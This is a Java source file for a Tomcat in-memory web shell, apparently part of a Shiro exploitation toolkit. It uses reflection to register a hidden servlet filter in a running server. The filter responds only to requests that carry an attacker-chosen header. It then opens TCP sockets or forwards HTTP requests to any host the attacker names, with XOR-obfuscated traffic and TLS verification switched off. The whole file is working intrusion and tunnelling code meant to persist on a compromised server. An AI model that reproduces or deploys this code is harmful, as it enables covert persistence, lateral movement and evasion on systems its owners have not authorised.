package com.y5neko.shiroexp.memshell;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.URL;
import java.nio.ByteBuffer;
import java.security.SecureRandom;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.Enumeration;
import java.util.EnumSet;
import java.util.HashMap;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.KeyManager;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletInputStream;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class Suo5Filter extends ClassLoader implements Filter, Runnable, HostnameVerifier, X509TrustManager {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String path = "/suo5";
    public static String headerName;
    public static String headerValue;
    public static HashMap addrs = collectAddr();
    public static HashMap ctx = new HashMap();
    InputStream gInStream;
    OutputStream gOutStream;

    public Suo5Filter() {
    }

    public Suo5Filter(ClassLoader c) {
        super(c);
    }

    public Suo5Filter(InputStream var1, OutputStream var2) {
        this.gInStream = var1;
        this.gOutStream = var2;
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        // 从请求头读取配置
        String pathFromHeader = this.request.getHeader("path");
        String headerNameFromHeader = this.request.getHeader("headerName");
        String headerValueFromHeader = this.request.getHeader("headerValue");

        // 设置值
        if (pathFromHeader != null && !pathFromHeader.isEmpty()) {
            path = pathFromHeader;
            // 确保 path 以 / 开头
            if (!path.startsWith("/")) {
                path = "/" + path;
            }
        }
        if (headerNameFromHeader != null && !headerNameFromHeader.isEmpty()) {
            headerName = headerNameFromHeader;
        }
        if (headerValueFromHeader != null && !headerValueFromHeader.isEmpty()) {
            headerValue = headerValueFromHeader;
        }

        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding("UTF-8");
            this.response.setCharacterEncoding("UTF-8");
            output.append(this.addFilter());
            output.append(" | Header-Name: " + headerName + " | Header-Value: " + headerValue);
        } catch (Exception var7) {
            output.append("ERROR:// " + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }
    }

    public String addFilter() throws Exception {
        javax.servlet.ServletContext servletContext = this.request.getServletContext();
        Filter filter = this;
        // 使用 path 作为 filterName，确保每个 path 都有独立的 Filter
        String filterName = "Suo5Filter" + this.path.replace("/", "_");
        if (filterName.startsWith("_")) {
            filterName = filterName.substring(1);
        }
        // 拦截 path 下的所有请求
        String url = this.path + "/*";

        Field contextField = null;
        org.apache.catalina.core.ApplicationContext applicationContext = null;
        org.apache.catalina.core.StandardContext standardContext = null;
        Field stateField = null;
        javax.servlet.FilterRegistration.Dynamic filterRegistration = null;

        String var11;
        try {
            contextField = servletContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            applicationContext = (org.apache.catalina.core.ApplicationContext)contextField.get(servletContext);
            contextField = applicationContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            standardContext = (org.apache.catalina.core.StandardContext)contextField.get(applicationContext);
            stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
            stateField.setAccessible(true);
            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);

            String existsMsg = null;
            // 检查Filter是否已存在
            if (servletContext.getFilterRegistration(filterName) != null) {
                existsMsg = "Filter already exists, overwriting...";
                // 删除旧的FilterDef和FilterMap
                try {
                    // 删除FilterMap
                    Class filterMapClass;
                    try {
                        filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                    } catch (Exception e) {
                        filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                    }
                    java.lang.reflect.Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
                    Object[] filterMaps = (Object[]) findFilterMaps.invoke(standardContext);

                    java.util.List<Object> filterMapsList = new java.util.ArrayList<>();
                    for (Object map : filterMaps) {
                        java.lang.reflect.Method getFilterName = filterMapClass.getMethod("getFilterName");
                        String name = (String) getFilterName.invoke(map);
                        if (!name.equalsIgnoreCase(filterName)) {
                            filterMapsList.add(map);
                        }
                    }

                    // 重新设置filterMaps
                    java.lang.reflect.Field filterMapsField = standardContext.getClass().getDeclaredField("filterMaps");
                    filterMapsField.setAccessible(true);
                    filterMapsField.set(standardContext, filterMapsList.toArray((Object[]) java.lang.reflect.Array.newInstance(filterMapClass, 0)));

                    // 删除FilterDef
                    java.lang.reflect.Method findFilterDef = standardContext.getClass().getMethod("findFilterDef", String.class);
                    Object filterDef = findFilterDef.invoke(standardContext, filterName);
                    if (filterDef != null) {
                        java.lang.reflect.Method removeFilterDef = standardContext.getClass().getMethod("removeFilterDef", filterDef.getClass());
                        removeFilterDef.invoke(standardContext, filterDef);
                    }
                } catch (Exception e) {
                    // 删除失败，忽略
                }
            }

            filterRegistration = servletContext.addFilter(filterName, filter);
            if (filterRegistration != null) {
                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
            }
            java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");
            filterStartMethod.setAccessible(true);
            filterStartMethod.invoke(standardContext, (Object[])null);
            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
            var11 = null;

            Class filterMap;
            try {
                filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            } catch (Exception var21) {
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
            }

            java.lang.reflect.Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
            Object[] filterMaps = (Object[])((Object[])findFilterMaps.invoke(standardContext));

            for(int i = 0; i < filterMaps.length; ++i) {
                Object filterMapObj = filterMaps[i];
                findFilterMaps = filterMap.getMethod("getFilterName");
                String name = (String)findFilterMaps.invoke(filterMapObj);
                if (name.equalsIgnoreCase(filterName)) {
                    filterMaps[i] = filterMaps[0];
                    filterMaps[0] = filterMapObj;
                }
            }

            String var25 = "Success";
            if (existsMsg != null) {
                return existsMsg + " " + var25;
            }
            return var25;
        } catch (Exception var22) {
            var11 = var22.getMessage();
        } finally {
            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
        }

        return var11;
    }

    public void init(FilterConfig var1) throws ServletException {
    }

    public void destroy() {
    }

    public void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3) throws IOException, ServletException {
        HttpServletRequest var4 = (HttpServletRequest)var1;
        HttpServletResponse var5 = (HttpServletResponse)var2;

        try {
            String var6 = var4.getHeader("Content-Type");
            if (var4.getHeader(headerName) != null && var4.getHeader(headerName).contains(headerValue) && var6 != null) {
                if (var6.equals("application/plain")) {
                    this.tryFullDuplex(var4, var5);
                    return;
                }

                if (var6.equals("application/octet-stream")) {
                    this.processDataBio(var4, var5);
                } else {
                    this.processDataUnary(var4, var5);
                }

                return;
            }
        } catch (Throwable var7) {
        }

        var3.doFilter(var1, var2);
    }

    public void readFull(InputStream var1, byte[] var2) throws IOException, InterruptedException {
        int var5;
        for(int var3 = 0; var3 < var2.length; var3 += var5) {
            int var4 = var2.length - var3;
            var5 = var1.read(var2, var3, var4);
            if (var5 == -1) {
                break;
            }
        }

    }

    public void tryFullDuplex(HttpServletRequest var1, HttpServletResponse var2) throws IOException, InterruptedException {
        ServletInputStream var3 = var1.getInputStream();
        byte[] var4 = new byte[32];
        this.readFull(var3, var4);
        ServletOutputStream var5 = var2.getOutputStream();
        var5.write(var4);
        var5.flush();
    }

    private HashMap newCreate(byte var1) {
        HashMap var2 = new HashMap();
        var2.put("ac", new byte[]{4});
        var2.put("s", new byte[]{var1});
        return var2;
    }

    private HashMap newData(byte[] var1) {
        HashMap var2 = new HashMap();
        var2.put("ac", new byte[]{1});
        var2.put("dt", var1);
        return var2;
    }

    private HashMap newDel() {
        HashMap var1 = new HashMap();
        var1.put("ac", new byte[]{2});
        return var1;
    }

    private HashMap newStatus(byte var1) {
        HashMap var2 = new HashMap();
        var2.put("s", new byte[]{var1});
        return var2;
    }

    byte[] u32toBytes(int var1) {
        byte[] var2 = new byte[]{(byte)(var1 >> 24), (byte)(var1 >> 16), (byte)(var1 >> 8), (byte)var1};
        return var2;
    }

    int bytesToU32(byte[] var1) {
        return (var1[0] & 255) << 24 | (var1[1] & 255) << 16 | (var1[2] & 255) << 8 | (var1[3] & 255) << 0;
    }

    synchronized void put(String var1, Object var2) {
        ctx.put(var1, var2);
    }

    synchronized Object get(String var1) {
        return ctx.get(var1);
    }

    synchronized Object remove(String var1) {
        return ctx.remove(var1);
    }

    byte[] copyOfRange(byte[] var1, int var2, int var3) {
        int var4 = var3 - var2;
        if (var4 < 0) {
            throw new IllegalArgumentException(var2 + " > " + var3);
        } else {
            byte[] var5 = new byte[var4];
            int var6 = Math.min(var1.length - var2, var4);

            for(int var7 = 0; var7 < var6; ++var7) {
                var5[var7] = var1[var2 + var7];
            }

            return var5;
        }
    }

    private byte[] marshal(HashMap var1) throws IOException {
        ByteArrayOutputStream var2 = new ByteArrayOutputStream();
        Object[] var3 = var1.keySet().toArray();

        for(int var4 = 0; var4 < var3.length; ++var4) {
            String var5 = (String)var3[var4];
            byte[] var6 = (byte[])((byte[])var1.get(var5));
            var2.write((byte)var5.length());
            var2.write(var5.getBytes());
            var2.write(this.u32toBytes(var6.length));
            var2.write(var6);
        }

        byte[] var8 = var2.toByteArray();
        ByteBuffer var9 = ByteBuffer.allocate(5 + var8.length);
        var9.putInt(var8.length);
        byte var10 = (byte)((int)(Math.random() * 255.0D + 1.0D));
        var9.put(var10);

        for(int var7 = 0; var7 < var8.length; ++var7) {
            var8[var7] ^= var10;
        }

        var9.put(var8);
        return var9.array();
    }

    private HashMap unmarshal(InputStream var1) throws Exception {
        byte[] var2 = new byte[5];
        this.readFull(var1, var2);
        ByteBuffer var3 = ByteBuffer.wrap(var2);
        int var4 = var3.getInt();
        byte var5 = var3.get();
        if (var4 > 33554432) {
            throw new IOException("invalid len");
        } else {
            byte[] var6 = new byte[var4];
            this.readFull(var1, var6);

            for(int var7 = 0; var7 < var6.length; ++var7) {
                var6[var7] ^= var5;
            }

            HashMap var14 = new HashMap();
            int var9 = 0;

            while(var9 < var6.length - 1) {
                short var10 = (short)var6[var9];
                ++var9;
                if (var9 + var10 >= var6.length) {
                    throw new Exception("key len error");
                }

                if (var10 < 0) {
                    throw new Exception("key len error");
                }

                byte[] var8 = this.copyOfRange(var6, var9, var9 + var10);
                String var11 = new String(var8);
                var9 += var10;
                if (var9 + 4 >= var6.length) {
                    throw new Exception("value len error");
                }

                var8 = this.copyOfRange(var6, var9, var9 + 4);
                int var12 = this.bytesToU32(var8);
                var9 += 4;
                if (var12 < 0) {
                    throw new Exception("value error");
                }

                if (var9 + var12 > var6.length) {
                    throw new Exception("value error");
                }

                byte[] var13 = this.copyOfRange(var6, var9, var9 + var12);
                var9 += var12;
                var14.put(var11, var13);
            }

            return var14;
        }
    }

    private void processDataBio(HttpServletRequest var1, HttpServletResponse var2) throws Exception {
        ServletInputStream var3 = var1.getInputStream();
        HashMap var4 = this.unmarshal(var3);
        byte[] var5 = (byte[])((byte[])var4.get("ac"));
        if (var5.length == 1 && var5[0] == 0) {
            var2.setBufferSize(512);
            ServletOutputStream var6 = var2.getOutputStream();
            var2.setHeader("X-Accel-Buffering", "no");

            Socket var7;
            try {
                String var8 = new String((byte[])((byte[])var4.get("h")));
                int var9 = Integer.parseInt(new String((byte[])((byte[])var4.get("p"))));
                if (var9 == 0) {
                    try {
                        var9 = (Integer)var1.getClass().getMethod("getLocalPort").invoke(var1);
                    } catch (Exception var18) {
                        var9 = (Integer)var1.getClass().getMethod("getServerPort").invoke(var1);
                    }
                }

                var7 = new Socket();
                var7.connect(new InetSocketAddress(var8, var9), 5000);
            } catch (Exception var20) {
                var6.write(this.marshal(this.newStatus((byte)1)));
                var6.flush();
                var6.close();
                return;
            }

            var6.write(this.marshal(this.newStatus((byte)0)));
            var6.flush();
            var2.flushBuffer();
            OutputStream var21 = var7.getOutputStream();
            InputStream var22 = var7.getInputStream();
            Thread var10 = null;

            try {
                Suo5Filter var11 = new Suo5Filter(var22, var6);
                var10 = new Thread(var11);
                var10.start();
                this.readReq(var3, var21);
            } catch (Exception var17) {
            } finally {
                var7.close();
                var6.close();
                if (var10 != null) {
                    var10.join();
                }

            }

        } else {
            var2.setStatus(403);
        }
    }

    private void readSocket(InputStream var1, OutputStream var2, boolean var3) throws IOException {
        byte[] var4 = new byte[8192];

        while(true) {
            int var5 = var1.read(var4);
            if (var5 <= 0) {
                return;
            }

            byte[] var6 = this.copyOfRange(var4, 0, 0 + var5);
            if (var3) {
                var6 = this.marshal(this.newData(var6));
            }

            var2.write(var6);
            var2.flush();
        }
    }

    private void readReq(InputStream var1, OutputStream var2) throws Exception {
        while(true) {
            HashMap var3 = this.unmarshal(var1);
            byte[] var4 = (byte[])((byte[])var3.get("ac"));
            if (var4.length != 1) {
                return;
            }

            byte var5 = var4[0];
            if (var5 == 2) {
                var2.close();
                return;
            }

            if (var5 == 1) {
                byte[] var6 = (byte[])((byte[])var3.get("dt"));
                if (var6.length != 0) {
                    var2.write(var6);
                    var2.flush();
                }
            } else if (var5 != 3) {
                return;
            }
        }
    }

    private void processDataUnary(HttpServletRequest var1, HttpServletResponse var2) throws Exception {
        ServletInputStream var3 = var1.getInputStream();
        BufferedInputStream var4 = new BufferedInputStream(var3);
        HashMap var5 = this.unmarshal(var4);
        String var6 = new String((byte[])((byte[])var5.get("id")));
        byte[] var7 = (byte[])((byte[])var5.get("ac"));
        if (var7.length != 1) {
            var2.setStatus(403);
        } else {
            byte var8 = var7[0];
            byte[] var9 = (byte[])((byte[])var5.get("r"));
            boolean var10 = var9 != null && var9.length > 0;
            String var11 = "";
            if (var10) {
                var5.remove("r");
                var11 = new String(var9);
                var10 = !this.isLocalAddr(var11);
            }

            if (var10 && var8 >= 1 && var8 <= 3) {
                HttpURLConnection var28 = this.redirect(var1, var5, var11);
                var28.disconnect();
            } else {
                var2.setBufferSize(512);
                ServletOutputStream var12 = var2.getOutputStream();
                Object var29;
                OutputStream var30;
                if (var8 == 2) {
                    var29 = this.get(var6);
                    if (var29 != null) {
                        var30 = (OutputStream)var29;
                        var30.close();
                    }
                } else if (var8 == 1) {
                    var29 = this.get(var6);
                    if (var29 == null) {
                        var12.write(this.marshal(this.newDel()));
                        var12.flush();
                        var12.close();
                    } else {
                        var30 = (OutputStream)var29;
                        byte[] var31 = (byte[])((byte[])var5.get("dt"));
                        if (var31.length != 0) {
                            var30.write(var31);
                            var30.flush();
                        }

                        var12.close();
                    }
                } else if (var8 == 0) {
                    var2.setHeader("X-Accel-Buffering", "no");
                    String var13 = new String((byte[])((byte[])var5.get("h")));
                    int var14 = Integer.parseInt(new String((byte[])((byte[])var5.get("p"))));
                    if (var14 == 0) {
                        try {
                            var14 = (Integer)var1.getClass().getMethod("getLocalPort").invoke(var1);
                        } catch (Exception var26) {
                            var14 = (Integer)var1.getClass().getMethod("getServerPort").invoke(var1);
                        }
                    }

                    Socket var16 = null;
                    HttpURLConnection var17 = null;
                    InputStream var15;
                    if (var10) {
                        var17 = this.redirect(var1, var5, var11);
                        var15 = var17.getInputStream();
                    } else {
                        try {
                            var16 = new Socket();
                            var16.connect(new InetSocketAddress(var13, var14), 5000);
                            var15 = var16.getInputStream();
                            this.put(var6, var16.getOutputStream());
                            var12.write(this.marshal(this.newStatus((byte)0)));
                            var12.flush();
                            var2.flushBuffer();
                        } catch (Exception var25) {
                            this.remove(var6);
                            var12.write(this.marshal(this.newStatus((byte)1)));
                            var12.flush();
                            var12.close();
                            return;
                        }
                    }

                    try {
                        this.readSocket(var15, var12, !var10);
                    } catch (Exception var24) {
                    } finally {
                        if (var16 != null) {
                            var16.close();
                        }

                        if (var17 != null) {
                            var17.disconnect();
                        }

                        var12.close();
                        this.remove(var6);
                    }

                }
            }
        }
    }

    public void run() {
        try {
            this.readSocket(this.gInStream, this.gOutStream, true);
        } catch (Exception var2) {
        }

    }

    static HashMap collectAddr() {
        HashMap var0 = new HashMap();

        try {
            Enumeration var1 = NetworkInterface.getNetworkInterfaces();

            while(var1.hasMoreElements()) {
                NetworkInterface var2 = (NetworkInterface)var1.nextElement();
                Enumeration var3 = var2.getInetAddresses();

                while(var3.hasMoreElements()) {
                    InetAddress var4 = (InetAddress)var3.nextElement();
                    String var5 = var4.getHostAddress();
                    if (var5 != null) {
                        int var6 = var5.indexOf(37);
                        if (var6 != -1) {
                            var5 = var5.substring(0, var6);
                        }

                        var0.put(var5, Boolean.TRUE);
                    }
                }
            }
        } catch (Exception var7) {
        }

        return var0;
    }

    boolean isLocalAddr(String var1) throws Exception {
        String var2 = (new URL(var1)).getHost();
        return addrs.containsKey(var2);
    }

    HttpURLConnection redirect(HttpServletRequest var1, HashMap var2, String var3) throws Exception {
        String var4 = var1.getMethod();
        URL var5 = new URL(var3);
        HttpURLConnection var6 = (HttpURLConnection)var5.openConnection();
        var6.setRequestMethod(var4);

        try {
            var6.getClass().getMethod("setConnectTimeout", Integer.TYPE).invoke(var6, new Integer(3000));
            var6.getClass().getMethod("setReadTimeout", Integer.TYPE).invoke(var6, new Integer(0));
        } catch (Exception var10) {
        }

        var6.setDoOutput(true);
        var6.setDoInput(true);
        if (HttpsURLConnection.class.isInstance(var6)) {
            ((HttpsURLConnection)var6).setHostnameVerifier(this);
            SSLContext var7 = SSLContext.getInstance("SSL");
            var7.init((KeyManager[])null, new TrustManager[]{this}, (SecureRandom)null);
            ((HttpsURLConnection)var6).setSSLSocketFactory(var7.getSocketFactory());
        }

        byte[] var11 = this.marshal(var2);
        Enumeration var8 = var1.getHeaderNames();

        while(var8.hasMoreElements()) {
            String var9 = (String)var8.nextElement();
            if (var9.equals("Content-Length")) {
                var6.setRequestProperty(var9, String.valueOf(var11.length));
            } else if (var9.equals("Host")) {
                var6.setRequestProperty(var9, var5.getHost());
            } else if (var9.equals("Connection")) {
                var6.setRequestProperty(var9, "close");
            } else if (!var9.equals("Content-Encoding") && !var9.equals("Transfer-Encoding")) {
                var6.setRequestProperty(var9, var1.getHeader(var9));
            }
        }

        OutputStream var12 = var6.getOutputStream();
        var12.write(var11);
        var12.flush();
        var12.close();
        var6.getResponseCode();
        return var6;
    }

    public boolean verify(String var1, SSLSession var2) {
        return true;
    }

    public void checkClientTrusted(X509Certificate[] var1, String var2) throws CertificateException {
    }

    public void checkServerTrusted(X509Certificate[] var1, String var2) throws CertificateException {
    }

    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }
}
